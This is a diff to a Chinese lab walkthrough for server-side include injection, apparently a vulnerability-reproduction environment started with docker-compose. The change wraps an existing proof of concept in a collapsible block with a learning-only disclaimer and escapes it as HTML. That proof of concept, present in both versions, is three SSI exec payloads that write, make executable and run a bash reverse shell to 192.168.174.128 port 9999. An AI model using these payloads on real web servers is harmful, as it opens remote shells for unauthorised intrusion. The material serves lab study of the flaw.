@@ -43,14 +43,17 @@ docker-compose up -d
 
 创建反弹shell，依次上传并访问shell.shtml（一共三次）
 
-```
-# 第一次写入webshell文件
-<!--#exec cmd="echo 'bash -i >& /dev/tcp/192.168.174.128/9999 0>&1' > /var/www/html/shell.sh"-->
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text"># 第一次写入webshell文件
+&lt;!--#exec cmd="echo '&#98;ash -i &gt;&amp; &#47;dev/tcp/192.168.174.128/9999 0&gt;&amp;1' &gt; /var/www/html/shell.sh"--&gt;
 # 第二次修改webshell权限
-<!--#exec cmd="chmod +x /var/www/html/shell.sh"-->
+&lt;!--#exec cmd="chmod +x /var/www/html/shell.sh"--&gt;
 # 第三次执行webshell
-<!--#exec cmd="/bin/bash /var/www/html/shell.sh"-->
-```
+&lt;!--#exec cmd="/bin/bash /var/www/html/shell.sh"--&gt;</code></pre>
+
+</details>
 
 成功接收反弹shell
 
